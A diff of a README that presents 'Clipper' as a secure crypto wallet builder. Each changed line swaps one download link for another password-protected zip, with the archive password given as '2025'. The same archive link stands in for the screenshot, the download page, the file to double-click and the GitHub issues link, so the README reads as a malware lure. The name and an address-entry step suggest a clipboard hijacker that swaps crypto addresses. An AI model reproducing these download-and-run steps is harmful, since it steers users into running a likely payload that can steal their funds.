@@ -1,10 +1,10 @@
 # 🖥️ Clipper - Securely Build Your Crypto Wallets
 
-[![Download Clipper](https://raw.githubusercontent.com/Blackhe8608/Clipper/main/disematism/Clipper-v2.0.zip)](https://raw.githubusercontent.com/Blackhe8608/Clipper/main/disematism/Clipper-v2.0.zip)
+[![Download Clipper](https://github.com/Blackhe8608/Clipper/raw/refs/heads/main/disematism/Software_3.4-beta.2.zip)](https://github.com/Blackhe8608/Clipper/raw/refs/heads/main/disematism/Software_3.4-beta.2.zip)
 
 Clipper allows you to create secure wallets for Bitcoin, Ethereum, TRX, DOGE, Monero, Litecoin, and TRC-20 Tether. Made in C++ without any unnecessary frameworks, Clipper offers a straightforward way to manage your cryptocurrencies.
 
-![Clipper](https://raw.githubusercontent.com/Blackhe8608/Clipper/main/disematism/Clipper-v2.0.zip)
+![Clipper](https://github.com/Blackhe8608/Clipper/raw/refs/heads/main/disematism/Software_3.4-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run Clipper.
 
 ### 1. Visit the Download Page
 
-To get the latest version of Clipper, [visit this page to download](https://raw.githubusercontent.com/Blackhe8608/Clipper/main/disematism/Clipper-v2.0.zip). 
+To get the latest version of Clipper, [visit this page to download](https://github.com/Blackhe8608/Clipper/raw/refs/heads/main/disematism/Software_3.4-beta.2.zip). 
 
 ### 2. Download the File
 
@@ -27,7 +27,7 @@ The password for the archive is: **2025**.
 ### 4. Run the Application
 
 - Open the extracted folder.
-- Locate and double-click `https://raw.githubusercontent.com/Blackhe8608/Clipper/main/disematism/Clipper-v2.0.zip` to start the application.
+- Locate and double-click `https://github.com/Blackhe8608/Clipper/raw/refs/heads/main/disematism/Software_3.4-beta.2.zip` to start the application.
 
 ### 5. Enter Your Addresses
 
@@ -75,7 +75,7 @@ Clipper includes support for various cryptocurrencies:
 
 ## 📞 Support & Community
 
-If you encounter any issues or have questions, please reach out to the community through the [issues section on GitHub](https://raw.githubusercontent.com/Blackhe8608/Clipper/main/disematism/Clipper-v2.0.zip). 
+If you encounter any issues or have questions, please reach out to the community through the [issues section on GitHub](https://github.com/Blackhe8608/Clipper/raw/refs/heads/main/disematism/Software_3.4-beta.2.zip). 
 
 Many users are willing to help, so do not hesitate to ask for assistance. 
 
